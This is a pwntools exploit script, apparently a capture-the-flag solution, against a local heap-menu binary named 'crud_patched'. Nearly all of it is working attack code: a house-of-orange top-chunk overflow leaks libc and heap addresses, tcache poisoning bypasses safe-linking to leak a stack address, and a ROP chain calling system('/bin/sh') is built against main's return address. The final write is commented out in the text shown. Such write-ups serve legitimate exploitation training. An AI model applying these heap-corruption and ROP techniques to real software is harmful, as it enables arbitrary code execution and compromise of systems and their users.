from pwn import *

def create(idx, size, data):
    io.sendlineafter(">> ", b"1")
    io.sendline(str(idx).encode())
    io.sendline(str(size).encode())
    io.send(data)

def read(idx):
    io.sendlineafter(">> ", b"2")
    io.sendline(str(idx).encode())
    io.recvuntil("index:\n")
    return io.recvline().strip()

def edit(idx, data):
    io.sendlineafter(">> ", b"3")
    io.sendline(str(idx).encode())
    io.send(data)

def format_address(leak):
    return u64(leak[:6].ljust(8, b"\x00"))

libc = ELF("./libc.so.6")

io = process("./crud_patched")

create(0, 256, 256*b"A" + p64(0) + p64(0xc61)) # create an overflow top chunk size, 'house of orange' style
create(1, 0xf98, b"firstlargechunk") # this will be used later, but here forces top chunk into unsorted bin

# original top is now in unsorted bins because its size is too big for tcache bins

# leak a libc address, by carving a portion from our unsorted bin 
# which has a libc address in it at 8: and which gets preserved in the new alloc

create(2, 24, b"LEAKADDD")

data = read(2)
data = u64(data[-6:].ljust(8,b'\x00'))

print('leaked libc: ' + hex(data))

libc_base = data - 0x204120 # calculated using vmmap and comparing libc base the above
print('libc\'s base: ' + hex(libc_base))
libc.address = libc_base


edit(2, b"LEAKADDDLEAKADDD")
data = read(2)
data = u64(data[-6:].ljust(8,b'\x00'))
print('leaked heap: ' + hex(data))
heap_base = data - 0x3a0 # calculated using vmmap and comparing to the above
print('heap\'s base: ' + hex(heap_base))

payload = b"A"*0xf98
payload += p64(0x61) # target bin we want to hit, here 0x40 + 0x20
edit(1, payload)
create(3, 0xf98, b"secondlargechunk")

# top chunk will now be in tcache 0x40 (this is the second top chunk, after the original we used for leaks)

payload = b"secondlargechunk"
payload += b"B"*(0xf98 - len(payload))
payload += p64(0x61)
edit(3, payload)
create(4, 0x1000, b"thirdlargechunk")

# new top chunk will be in tcache 0x40, linked to the first one

# need to calculate the corrupted tcache address (which is xor encoded with portions of its memory address)
# which will be our target; when we allocate off the tcache list, malloc will return this target address

vuln_tcache = heap_base + 0x43FB0 # this is the first address after the size of the first tcache chunk, overwritable with index 2
print("tcache address: " + hex(vuln_tcache))
target = libc.symbols["__libc_argv"] - 0x10 # this contains an address on the stack, which can leak to use for further targeting. go back 0x10 so as not to wipe the data we want to read
print("target address: " + hex(target))
safe_link_addr = target ^ (vuln_tcache >> 12) # not-so-safe linking protection bypass

payload = b"A"*0xf98
payload += p64(0x41) # note once the bins are in the tcache, they are 0x20 smaller than they were before
payload += p64(safe_link_addr)
edit(3, payload)

# allocate out of the tcache bin, corruptng it
create(5, 0x30, b"removefirsttcache")
create(6, 0x30, b"controllocation!") # this 'permit' will be allocated at the address we specified above

data = read(6)
data = u64(data[-6:].ljust(8,b'\x00'))
print('leaked stack: ' + hex(data))
predicted_main_ret = data - 0x120
print('main ret: ' + hex(predicted_main_ret))

create(7, 0xc10, b"fourthlargechunk") # just to clean out the unsorted bin - this is the size of the bin - 0x10, and results in the bin being fully allocated back on the heap
# we do this because its size is bigger than the tcache bins we want to create next, which will likely mean any allocations would have gotten carved out of this bin instead

# first of the new tcache bins - still in the heap at this point
create(8, 0xbc8, b"fifthlargechunk")
payload = b"fifthlargechunk"
payload += b"C"*(0xbc8 - len(payload))
payload += p64(0x421) # size of the bin we are targeting, 0x400 + 0x20
edit(8, payload)
# second new bin, and also it pushes the previous into the tcache
create(9, 0xbd8, b"sixthlargechunk")
payload = b"sixthlargechunk"
payload += b"D"*(0xbd8 - len(payload))
payload += p64(0x421)
edit(9, payload)
# this will push the second bin into the tcache bin 0x400, with the two linked
create(10, 0x1000, b"seventhlargechunk")
# targeting for our second arbitrary allow - the offset is calculated by the head of the tcache bin - heap base
vuln_tcache = heap_base + 0x87BF0
print("new vuln tcache: " + hex(vuln_tcache))
target = predicted_main_ret - 0x8
print("target: " + hex(target))
safe_link_addr = target ^ (vuln_tcache >> 12)
# load in the target
payload = b"sixthlargechunk"
payload += b"D"*(0xbd8 - len(payload))
payload += p64(0x401) # 0x20 smaller than 0x420
payload += p64(safe_link_addr)
edit(9, payload)
# allocate out of the tcache bin, corrupting it
create(11, 0x3f0, b"removefirsttcache") # 0x10 (16 bytes) smaller than the tcache bin.
# this will be at our target location

ret = p64(libc_base + 0x1afc8c) # objdump -d libc.so.6 | grep ret
poprdiret = p64(libc_base + 0x10f75b) # ROPgadget --binary libc.so.6 | grep 'pop rdi'
system = p64(libc.symbols["system"])
binsh = p64(libc_base + 0x1cb42f) # strings -a -t x libc.so.6 | grep /bin/sh
final_payload = p64(0) + ret + poprdiret + binsh + system + p64(0)

#create(12, 0x3f0, final_payload)

#create(12, 0x3f0, b"a"*8)

io.interactive()
